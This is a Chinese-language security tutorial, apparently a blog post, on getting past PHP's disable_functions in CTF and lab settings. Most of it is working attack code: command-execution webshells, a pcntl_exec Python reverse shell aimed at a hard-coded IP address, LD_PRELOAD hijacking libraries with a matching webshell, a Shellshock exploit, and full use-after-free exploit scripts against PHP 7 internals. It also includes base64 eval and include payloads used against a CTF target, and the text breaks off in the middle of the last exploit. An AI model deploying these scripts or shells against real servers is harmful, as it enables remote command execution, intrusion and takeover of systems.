##  前言

有些时候，phpinfo()有`disable_functions`

![image-20210209143246016](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271738816.jpeg)

蚁剑终端命令不起作用，就可能是`df`的问题

![image-20220326232444077](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271009159.png)

##  黑名单绕过

就是一些运维人员php命令执行的函数没禁用完

```php
exec,passthru,shell_exec,eval,system,popen,proc_open(),pcntl_exec
```

前几种都比较简单

**popen**

打开进程文件指针

```php
<?php
$command=$_POST['cmd'];
$handle = popen($command,"r");
while(!feof($handle)){        
    echo fread($handle, 1024);  //fread($handle, 1024);
}  
pclose($handle);
?>
```

**proc_open**

proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。

```php
<?php
$command="ipconfig";
$descriptorspec = array(1 => array("pipe", "w"));
$handle = proc_open($command ,$descriptorspec , $pipes);
while(!feof($pipes[1])){     
    echo fread($pipes[1], 1024); //fgets($pipes[1],1024);
}
?>
```

```php
$descriptorspec = array(
   0 => array("pipe", "r"),  // 标准输入，子进程从此管道中读取数据
   1 => array("pipe", "w"),  // 标准输出，子进程向此管道中写入数据
   2 => array("file", "/tmp/error-output.txt", "a") // 标准错误，写入到一个文件
);
```

**pcntl_exec**

在当前进程空间执行指定程序

CTF题：[[第四届“蓝帽杯”决赛\]php](https://whoamianony.top/2020/12/21/CTF比赛记录/第四届“蓝帽杯”全国大学生网络安全技能大赛决赛WriteUp/#php)

利用`pcntl_exec()`执行`test.sh`：

```php
<?php
if(function_exists('pcntl_exec')) {
   pcntl_exec("/bin/bash", array("/tmp/test.sh"));
} else {
       echo 'pcntl extension is not support!';
}
?>
```

由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：

```php
<?php pcntl_exec("/usr/bin/python",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("132.232.75.90",9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'));
```

##  利用 LD_PRELOAD 环境变量

### LD_PRELOAD 简介 

LD_PRELOAD 是 Linux 系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的攻击目的。

我们通过环境变量 LD_PRELOAD 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。

### 利用条件 

> 1. mail() 函数和 error_log() 函数所调用的 sendmail 已安装
> 2. 不限制 /usr/sbin/sendmail 的执行
> 3. mail() 函数和 error_log() 函数有一个未被禁用
> 4. 可以上传我们的so文件和php文件
> 5. 命令执行包含该so文件

### 劫持 getuid()

前提是在 Linux 中已安装并启用 sendmail 程序。

php 的 mail() 函数在执行过程中会默认调用系统程序 / usr/sbin/sendmail，而 / usr/sbin/sendmail 会调用 getuid()。如果我们能通过 LD_PRELOAD 的方式来劫持 getuid()，再用 mail() 函数来触发 sendmail 程序进而执行被劫持的 getuid()，从而就能执行恶意代码了。

- 编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 a.so；
- 运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 a.so，以便后续启动新进程时优先加载该共享对象；
- 运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 a.so 中的同名 getuid() 所劫持；
- 达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的

首先编写 test.c，劫持 getuid() 函数，获取 LD_PRELOAD 环境变量并预加载恶意的共享库，再删除环境变量 LD_PRELOAD，最后执行由 EVIL_CMDLINE 环境变量获取的系统命令



```php
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int geteuid() {
        const char* cmdline = getenv("EVIL_CMDLINE");
        if (getenv("LD_PRELOAD") == NULL) { return 0; }
        unsetenv("LD_PRELOAD");
        system(cmdline);
}
```

当这个共享库中的 getuid() 被调用时，尝试加载 payload() 函数执行命令。

接着用以下语句编译 C 文件为共享对象文件：



```c
gcc -shared -fPIC test.c -o test.so
```

最后编写 test.php：



```php
<?php
    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);
    mail("", "", "", "");
    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
    unlink($out_path);
?>
```

这里接受 3 个参数，一是 cmd 参数，待执行的系统命令；二是 outpath 参数，保存命令执行输出结果的文件路径，便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径。

这里通过 putenv() 函数将 LD_PRELOAD 环境变量设置为恶意的 test.so、将自定义的 EVIL_CMDLINE 环境变量赋值为要执行的命令；然后调用 mail() 函数触发 sendmail()，再通过 sendmail() 触发 getuid() 从而使恶意的 test.so 被加载执行；最后再输出内容到页面上并删除临时存放命令执行结果的文件。

访问 test.php，输入相应的参数即可执行成功

### 劫持启动进程 

第一种方法是劫持 getuid()，是较为常用的方法，但存在缺陷：

- 目标 Linux 未安装或为启用 sendmail；

- 即便目标可以启用 sendmail，由于未将主机名添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts；

  （hosts文件是主机名和IP地址映射）

编写 bypass_disablefunc.c



```php
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>


extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv("EVIL_CMDLINE");

    // unset environment variable LD_PRELOAD.
    // unsetenv("LD_PRELOAD") no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\0';
            }
    }

    // executive command
    system(cmdline);
}
```

接着用以下语句编译 C 文件为共享对象文件：



```c
gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so
```

bypass_disablefunc.php，代码和 test.php 一致：



```php
<?php
    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);
    mail("", "", "", "");
    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
    unlink($out_path);
?>
```

###  演示过程

[2020GKCTF]checkin



执行命令，先看phpinfo()

```
/?Ginkgo=cGhwaW5mbygpOw==
# 即phpinfo();
```

![image-20220326232342829](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271036697.png)

需要绕过`df`

先拿shell

```
/?Ginkgo=ZXZhbCgkX1BPU1Rbd2hvYW1pXSk7
# 即eval($_POST[whoami]); 
```

蚁剑连接后，没权限打开flag

![image-20220326232543358](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271036793.png)





终端命令也不行，那就需要绕过`df`才行

![image-20220326232444077](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271036764.png)



方法1：**利用LD_PRELOAD环境变量**

下载该项目的利用文件：https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD

本项目中有这几个关键文件：

![image-20220326235004837](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271036681.png)

> bypass_disablefunc.php：一个用来执行命令的 webshell。
>
> bypass_disablefunc_x64.so或bypass_disablefunc_x86.so：执行命令的共享对象文件，分为64位的和32位的。
>
> bypass_disablefunc.c：用来编译生成上面的共享对象文件。

对于bypass_disablefunc.php，权限上传到web目录的直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：

> cmd 参数：待执行的系统命令，如 id 命令。
>
> outpath 参数：保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。
>
> sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。

想办法将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标有权限的目录中

![image-20220326235102214](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271036706.png)

这个目录上传失败

去`/var/tmp`上传，成功

![image-20220326235210417](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271036819.png)

开始利用

然后将bypass_disablefunc.php包含进来并使用GET方法提供所需的三个参数：

```
/?Ginkgo=aW5jbHVkZSgiL3Zhci90bXAvYnlwYXNzX2Rpc2FibGVmdW5jLnBocCIpOw==&cmd=id&outpath=/tmp/outfile123&sopath=/var/tmp/bypass_disablefunc_x64.so
# include("/var/tmp/bypass_disablefunc.php");
```

![image-20220326235302209](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271036036.png)

##  利用ShellShock(CVE-2014-6271)

### 使用条件：

> Linux 操作系统
>
> `putenv()`、`mail()`或`error_log()`函数可用
>
> 目标系统的`/bin/bash`存在`CVE-2014-6271`漏洞
>
> `/bin/sh -> /bin/bash`sh 默认的 shell 是 bash

### 原理简述

该方法利用的bash中的一个老漏洞，即Bash Shellshock 破壳漏洞（CVE-2014-6271）。

该漏洞的原因是Bash使用的环境变量是通过函数名称来调用的，导致该漏洞出现是以`(){`开头定义的环境变量在命令 ENV 中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。

一般函数体内的代码不会被执行，但破壳漏洞会错误的将"{}"花括号外的命令进行执行。PHP里的某些函数（例如：mail()、imap_mail()）能调用popen或其他能够派生bash子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令。

###  演示过程

我们利用 [AntSword-Labs](https://github.com/AntSwordProject/AntSword-Labs)项目来搭建环境：

云服务docker搭建

```
git clone https://github.com/AntSwordProject/AntSword-Labs.git
cd AntSword-Labs/bypass_disable_functions/2
docker-compose up -d
```

搭建完成后访问 `http://your-ip:18080`

看phpinfo()

![image-20220327104501696](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271045766.png)

上蚁剑

![image-20220327104626381](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271046479.png)



AntSword 虚拟终端中已经集成了对 ShellShock 的利用，直接在虚拟终端执行命令即可绕过disable_functions：

![image-20220327104740788](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271047878.png)



可以选择手动利用。在有权限的目录中（/var/tmp/shell.php）上传以下利用脚本：

```php
<?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(".","data"); 
   putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1"); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   //mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
   error_log('a',1);
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != "") return $output; 
   else return "No output, or not vuln."; 
} 
echo shellshock($_REQUEST["cmd"]); 
?>
```

上传到`/var/tmp`目录下,命令执行包含该文件

![Inked202203271051750_LI](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271320577.jpg)



## php-json-bypass

### 使用条件:

Linux 操作系统

PHP 版本

> 7.1 - all versions to date
>
> 7.2 < 7.2.19 (released: 30 May 2019)
>
> 7.3 < 7.3.6 (released: 30 May 2019)

### 原理简述

此漏洞利用json序列化程序中的释放后使用[漏洞](https://bugs.php.net/bug.php?id=77843)，利用json序列化程序中的堆溢出触发，以绕过`disable_functions`和执行系统命令。

###  利用脚本

```php
<?php

$cmd = "id";

$n_alloc = 10; # increase this value if you get segfaults

class MySplFixedArray extends SplFixedArray {
    public static $leak;
}

class Z implements JsonSerializable {
    public function write(&$str, $p, $v, $n = 8) {
      $i = 0;
      for($i = 0; $i < $n; $i++) {
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8;
      }
    }

    public function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    public function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    # unable to leak ro segments
    public function leak1($addr) {
        global $spl1;

        $this->write($this->abc, 8, $addr - 0x10);
        return strlen(get_class($spl1));
    }

    # the real deal
    public function leak2($addr, $p = 0, $s = 8) {
        global $spl1, $fake_tbl_off;

        # fake reference zval
        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted
        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
        $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)

        $leak = strlen($spl1::$leak);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }

        return $leak;
    }

    public function parse_elf($base) {
        $e_type = $this->leak2($base, 0x10, 2);

        $e_phoff = $this->leak2($base, 0x20);
        $e_phentsize = $this->leak2($base, 0x36, 2);
        $e_phnum = $this->leak2($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = $this->leak2($header, 0, 4);
            $p_flags = $this->leak2($header, 4, 4);
            $p_vaddr = $this->leak2($header, 0x10);
            $p_memsz = $this->leak2($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    public function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = $this->leak2($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = $this->leak2($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    public function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = $this->leak2($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    public function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->leak2($addr);
            $f_name = $this->leak2($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return $this->leak2($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    public function jsonSerialize() {
        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;

        $contiguous = [];
        for($i = 0; $i < $n_alloc; $i++)
            $contiguous[] = new DateInterval('PT1S');

        $room = [];
        for($i = 0; $i < $n_alloc; $i++)
            $room[] = new Z();

        $_protector = $this->ptr2str(0, 78);

        $this->abc = $this->ptr2str(0, 79);
        $p = new DateInterval('PT1S');

        unset($y[0]);
        unset($p);

        $protector = ".$_protector";

        $x = new DateInterval('PT1S');
        $x->d = 0x2000;
        $x->h = 0xdeadbeef;
        # $this->abc is now of size 0x2000

        if($this->str2ptr($this->abc) != 0xdeadbeef) {
            die('UAF failed.');
        }

        $spl1 = new MySplFixedArray();
        $spl2 = new MySplFixedArray();

        # some leaks
        $class_entry = $this->str2ptr($this->abc, 0x120);
        $handlers = $this->str2ptr($this->abc, 0x128);
        $php_heap = $this->str2ptr($this->abc, 0x1a8);
        $abc_addr = $php_heap - 0x218;

        # create a fake class_entry
        $fake_obj = $abc_addr;
        $this->write($this->abc, 0, 2); # type
        $this->write($this->abc, 0x120, $abc_addr); # fake class_entry

        # copy some of class_entry definition
        for($i = 0; $i < 16; $i++) {
            $this->write($this->abc, 0x10 + $i * 8, 
                $this->leak1($class_entry + 0x10 + $i * 8));
        }

        # fake static members table
        $fake_tbl_off = 0x70 * 4 - 16;
        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);

        # fake zval_reference
        $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval
        $this->write($this->abc, $fake_tbl_off + 8, 10); # zval type (reference)

        # look for binary base
        $binary_leak = $this->leak2($handlers + 0x10);
        if(!($base = $this->get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }

        # parse elf header
        if(!($elf = $this->parse_elf($base))) {
            die("Couldn't parse ELF");
        }

        # get basic_functions address
        if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }

        # find system entry
        if(!($zif_system = $this->get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }
        
        # copy hashtable offsetGet bucket
        $fake_bkt_off = 0x70 * 5 - 16;

        $function_data = $this->str2ptr($this->abc, 0x50);
        for($i = 0; $i < 4; $i++) {
            $this->write($this->abc, $fake_bkt_off + $i * 8, 
                $this->leak2($function_data + 0x40 * 4, $i * 8));
        }

        # create a fake bucket
        $fake_bkt_addr = $abc_addr + $fake_bkt_off;
        $this->write($this->abc, 0x50, $fake_bkt_addr);
        for($i = 0; $i < 3; $i++) {
            $this->write($this->abc, 0x58 + $i * 4, 1, 4);
        }

        # copy bucket zval
        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
        for($i = 0; $i < 12; $i++) {
            $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8, 
                $this->leak2($function_zval, $i * 8));
        }

        # pwn
        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);

        $spl1->offsetGet($cmd);

        exit();
    }
}

$y = [new Z()];
json_encode([&$y]);
```

###  演示过程

还是一样的，先上传文件到目标主机上，如果是web目录则直接传参执行命令，如果是其他有权限的目录，则将脚本包含进来再传参执行命令。



还是利用上面的`AntSword-Labs`环境

上传文件到`/var/tmp`，修改

![image-20220327110311906](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271103033.png)

然后包含文件，直接执行命令



##  php-GC-bypass

### 使用条件：

Linux 操作系统

PHP 版本

> 7.0 - all versions to date
>
> 7.1 - all versions to date
>
> 7.2 - all versions to date
>
> 7.3 - all versions to date

### 原理简述

此漏洞利用PHP垃圾收集器中存在三年的一个 [bug](https://bugs.php.net/bug.php?id=72530)，通过PHP垃圾收集器中堆溢出来绕过`disable_functions`并执行系统命令。

###  利用脚本

```php
<?php

# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
#
# Author: https://github.com/mm0r1

pwn("uname -a");

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;

        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);

    exit();
}
```

###  演示过程

上传文件

![image-20220327001004963](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271109577.png)

包含得flag

```
include('/tmp/shell.php');base64编码之后得到：aW5jbHVkZSgnL3RtcC9zaGVsbC5waHAnKTs=
```

![image-20220327001059977](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203271109588.png)



## 利用 Backtrace

### 使用条件：

Linux 操作系统

PHP 版本

> 7.0 - all versions to date
>
> 7.1 - all versions to date
>
> 7.2 - all versions to date
>
> 7.3 < 7.3.15 (released 20 Feb 2020)
>
> 7.4 < 7.4.3 (released 20 Feb 2020)

### 原理简述

该漏洞利用在debug_backtrace()函数中使用了两年的一个 [bug](https://bugs.php.net/bug.php?id=76047)。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。

### 利用脚本

```php
<?php

# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=76047
# debug_backtrace() returns a reference to a variable 
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30/01/2020.
#
# Author: https://github.com/mm0r1

pwn("uname -a");

function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
